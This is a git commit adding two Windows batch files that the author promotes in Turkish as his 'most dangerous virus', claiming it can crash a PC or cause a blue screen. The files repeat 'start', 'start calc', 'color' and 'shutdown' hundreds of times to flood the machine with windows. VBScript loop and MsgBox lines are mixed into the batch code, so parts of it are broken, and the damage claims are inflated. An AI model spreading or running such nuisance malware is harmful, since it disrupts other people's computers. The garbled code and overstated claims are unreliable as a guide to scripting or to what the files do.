492e1fccca99258dc57c86c4b8b63e1ee69d77f3
Virüscü Abey <gencdoganimrat@gmail.com>
2025-01-09 12:42:11 +0300

    Parti Serisi
    ŞU ANA KADAR YAPTIĞIM EN TEHLİKELİ VİRÜS!!! PCYİ ÇÖKERTEBİLİR MAVİ EKRAN VERDİRTEBİLİR!!! ANA PCDE DENEMEK SİZİN SORUMLULUĞUNUZ!!! BEN VBOXDA DENEYİN DİYORUM VE BU VİRÜS PCNİZİ SIKINTIYA SOKARSA BEN SORUMLULUK KABUL ETMEM!!! BUNU OKULABUNU.MD DOSYAMDADA DEMİŞTİM!! BUNU UNUTMAYIN!!!

---
+++ PartiKısaVersiyon.bat
@@ -0,0 +1,86 @@
+do
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+loop
---
+++ PartiMEGA.bat
@@ -0,0 +1,2022 @@
+
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+do
+X = MsgBox ( "PARTİ ZAMANI VİYY ", 5 + 16 , "Windows")
+loop
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+vvcolor a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+shutdown
+color a
+shutdown
+start
+start calc
+start calc
+start
+color c
+shutdown
+color a
+start
+color c
+start
+
